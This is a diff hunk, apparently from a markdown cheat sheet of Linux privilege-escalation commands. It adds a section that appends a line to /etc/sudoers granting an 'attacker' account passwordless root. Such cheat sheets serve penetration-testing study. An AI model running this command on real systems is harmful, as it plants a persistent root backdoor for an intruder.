@@ -1335,7 +1335,11 @@ cat .bashrc
 sudo -l
 ~~~
 
+#### Add user to sudoers List
 
+~~~ bash
+echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+~~~~
 
 
 
